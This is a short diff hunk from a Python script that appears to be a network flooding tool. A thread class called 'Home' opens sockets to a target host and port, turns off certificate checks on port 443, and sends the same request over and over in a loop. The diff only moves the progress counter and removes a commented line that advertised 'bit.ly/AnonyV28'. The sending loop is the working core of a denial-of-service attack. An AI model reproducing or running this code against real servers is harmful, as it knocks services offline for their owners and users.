@@ -1134,13 +1134,13 @@ class Home(threading.Thread):
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((str(host_url), int(port)))
+                req_code += 1
+                sys.stdout.write("Home @ | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
+                sys.stdout.flush()
                 if str(port) == '443':
                     s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,ssl_version=ssl.PROTOCOL_SSLv23)
                     s.send(str.encode(request))
                 print("[+] Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
-                #req_code += 1
-                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
-                #sys.stdout.flush()
                 try:
                     for y in range(multiple):
                         s.send(str.encode(request))
